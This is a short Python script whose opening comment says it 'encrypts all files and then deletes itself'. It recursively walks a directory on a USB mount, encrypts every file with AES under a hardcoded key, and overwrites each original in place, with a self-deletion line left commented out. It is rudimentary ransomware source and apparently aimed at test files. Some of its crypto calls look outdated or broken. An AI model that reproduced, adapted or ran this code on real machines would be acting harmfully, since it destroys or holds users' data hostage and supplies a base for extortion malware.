#
#This one encrypts all files and then deletes itself so don't run it
#


from Crypto.Cipher import AES
import base64
import os
import glob
from os import remove


orPath = os.path.realpath(__file__)

path = "/media/usb1/testfiles/"
#path = "/Volumes/NO NAME/testfiles/"
os.chdir(path)




for filename in glob.iglob(path + '**/*', recursive=True):
    print(filename)
    # if not os.path.exists(filename):
    #     SystemExit()
    if os.path.isfile(filename) == True:
        file = open(filename)
        text = file.read()
        
        def encryption(info) :
            BLOCK_SIZE = 16
            PADDING ='{'
            pad = lambda s: s+ (BLOCK_SIZE - len(s) % BLOCK_SIZE)*PADDING
            key = 'CE10BDC7BDF43EDE08D8A856AF1DD6B8' 
            cipher= AES.new(key)
            EncodeAES = lambda c, s: base64.b64encode(c.encrypt (pad (s)))
            encoded = EncodeAES(cipher, info)
            return encoded
        
        outputText = encryption(text)
        file = open(filename, "wb")
        file.write(outputText)
        file.close()
        print("{0} encrypted".format(filename))
        
    
print('Encryption done')
#remove(orPath)